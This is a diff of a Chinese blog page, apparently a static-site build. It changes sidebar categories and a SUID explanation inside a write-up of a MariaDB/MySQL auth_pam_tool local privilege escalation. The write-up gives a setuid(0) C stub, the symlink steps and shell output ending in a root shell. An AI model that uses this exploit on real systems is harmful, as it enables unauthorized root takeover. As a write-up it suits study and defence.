@@ -195,6 +195,14 @@
         
 
             <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Ethereum/">
+                    Ethereum <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/算法/">
                     算法 <span class="right">1</span></a>
                 </a>
@@ -227,16 +235,8 @@
         
 
             <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/Ethereum/">
-                    Ethereum <span class="right">3</span></a>
-                </a>
-            </li>
-
-        
-
-            <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/Android/">
-                    Android <span class="right">7</span></a>
+                    Android <span class="right">8</span></a>
                 </a>
             </li>
 
@@ -267,16 +267,16 @@
         
 
             <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/CVE/">
-                    CVE <span class="right">3</span></a>
+                <a class="no-padding" href="/categories/A简历/">
+                    A简历 <span class="right">1</span></a>
                 </a>
             </li>
 
         
 
             <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/A简历/">
-                    A简历 <span class="right">1</span></a>
+                <a class="no-padding" href="/categories/CVE/">
+                    CVE <span class="right">3</span></a>
                 </a>
             </li>
 
@@ -382,6 +382,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果设置了 --user 进入这里</span></span><br><span class="line">481 <span class="keyword">if</span> <span class="built_in">test</span> -n <span class="string">"<span class="variable">$user</span>"</span></span><br><span class="line">482 <span class="keyword">then</span></span><br><span class="line">483   chown <span class="variable">$user</span> <span class="string">"<span class="variable">$pamtooldir</span>/auth_pam_tool_dir"</span> &amp;&amp; \</span><br><span class="line">484   chmod 0700 <span class="string">"<span class="variable">$pamtooldir</span>/auth_pam_tool_dir"</span></span><br><span class="line">485   <span class="keyword">if</span> <span class="built_in">test</span> $? -ne 0</span><br><span class="line">486   <span class="keyword">then</span></span><br><span class="line">487       <span class="built_in">echo</span> <span class="string">"Cannot change ownership of the '<span class="variable">$pamtooldir</span>/auth_pam_tool_dir' directory"</span></span><br><span class="line">488       <span class="built_in">echo</span> <span class="string">" to the '<span class="variable">$user</span>' user. Check that you have the necessary permissions and try again."</span></span><br><span class="line">489       <span class="built_in">exit</span> 1</span><br><span class="line">490   <span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 如果没有设置 --srcdir 进入这里</span></span><br><span class="line">491   <span class="keyword">if</span> <span class="built_in">test</span> -z <span class="string">"<span class="variable">$srcdir</span>"</span></span><br><span class="line">492   <span class="keyword">then</span></span><br><span class="line">493     chown 0 <span class="string">"<span class="variable">$pamtooldir</span>/auth_pam_tool_dir/auth_pam_tool"</span> &amp;&amp; \</span><br><span class="line">494     chmod 04755 <span class="string">"<span class="variable">$pamtooldir</span>/auth_pam_tool_dir/auth_pam_tool"</span></span><br><span class="line">495     <span class="keyword">if</span> <span class="built_in">test</span> $? -ne 0</span><br><span class="line">496     <span class="keyword">then</span></span><br><span class="line">497         <span class="built_in">echo</span> <span class="string">"Couldn't set an owner to '<span class="variable">$pamtooldir</span>/auth_pam_tool_dir/auth_pam_tool'."</span></span><br><span class="line">498         <span class="built_in">echo</span> <span class="string">" It must be root, the PAM authentication plugin doesn't work otherwise.."</span></span><br><span class="line">499         <span class="built_in">echo</span></span><br><span class="line">500     <span class="keyword">fi</span></span><br><span class="line">501   <span class="keyword">fi</span></span><br><span class="line">502   args=<span class="string">"<span class="variable">$args</span> --user=<span class="variable">$user</span>"</span></span><br><span class="line">503 <span class="keyword">fi</span></span><br><span class="line">504</span><br><span class="line">505 <span class="keyword">if</span> <span class="built_in">test</span> -f <span class="string">"<span class="variable">$ldata</span>/mysql/user.frm"</span></span><br><span class="line">506 <span class="keyword">then</span></span><br><span class="line">507     <span class="built_in">echo</span> <span class="string">"mysql.user table already exists!"</span></span><br><span class="line">508     <span class="built_in">echo</span> <span class="string">"Run mysql_upgrade, not mysql_install_db"</span></span><br><span class="line">509     <span class="built_in">exit</span> 0</span><br><span class="line">510 <span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
 <p><code>chmod 04755 &quot;$pamtooldir/auth_pam_tool_dir/auth_pam_tool&quot;</code></p>
 <p>主要是这句话，0 的意思是所有权是 root，4 是设置 suid 当用户执行它的时候，用临时拥有文件所有者权利。</p>
+<p>SUID (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux/Unix 中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID 被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文件。简而言之用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有者的 UID 和 GID。</p>
 <h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>有了这个点就很容易利用它来提权了，写一个下面这个东西来替换<code>auth_pam_tool</code>：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">"ps"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>但是我装的环境可能已经加上补丁了，对目录没有读权限了，现在把它恢复到有漏洞的情况，就是有读和执行权限。我的环境，我也没有删除权限啊….</p>
@@ -393,7 +394,7 @@
 <h2 id="重点在这"><a href="#重点在这" class="headerlink" title="重点在这"></a>重点在这</h2><p>我刚反应过来为啥啥啥都不行了，因为应该用 mysql 那个用户，不是我随便建的呜呜呜。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/usr/lib/mysql/plugin/auth_pam_tool_dir</span><br><span class="line">$ rm auto_pam_tool</span><br><span class="line">rm: cannot remove <span class="string">'auto_pam_tool'</span>: No such file or directory</span><br><span class="line">$ rm auth_pam_tool</span><br><span class="line">rm: remove write-protected regular file <span class="string">'auth_pam_tool'</span>? y</span><br><span class="line">$ ln -s /tmp/exp auth_pam_tool</span><br><span class="line">$ ls -al</span><br><span class="line">total 8</span><br><span class="line">drwx------ 1 mysql root  4096 Mar 24 15:24 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Oct 31 23:00 ..</span><br><span class="line">lrwxrwxrwx 1 mysql mysql    8 Mar 24 15:24 auth_pam_tool -&gt; /tmp/exp</span><br><span class="line">$ ln -s /bin/bash ps</span><br><span class="line">$ ls -al</span><br><span class="line">total 8</span><br><span class="line">drwx------ 1 mysql root  4096 Mar 24 15:25 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Oct 31 23:00 ..</span><br><span class="line">lrwxrwxrwx 1 mysql mysql    8 Mar 24 15:24 auth_pam_tool -&gt; /tmp/exp</span><br><span class="line">lrwxrwxrwx 1 mysql mysql    9 Mar 24 15:25 ps -&gt; /bin/bash</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
 <p>切到 root 执行<code>mysql_install_db --user=mysql</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@979958b00a34:/usr/lib/mysql/plugin/auth_pam_tool_dir# su mysql</span><br><span class="line">$ pwd</span><br><span class="line">/usr/lib/mysql/plugin/auth_pam_tool_dir</span><br><span class="line">$ ./auth_pam_tool</span><br><span class="line">root@979958b00a34:/usr/lib/mysql/plugin/auth_pam_tool_dir# whoami</span><br><span class="line">root</span><br><span class="line">root@979958b00a34:/usr/lib/mysql/plugin/auth_pam_tool_dir#</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@979958b00a34:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># su mysql</span></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/usr/lib/mysql/plugin/auth_pam_tool_dir</span><br><span class="line">$ ./auth_pam_tool</span><br><span class="line">root@979958b00a34:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@979958b00a34:/usr/lib/mysql/plugin/auth_pam_tool_dir<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 <p>嘤嘤嘤，可以了</p>
 
                 
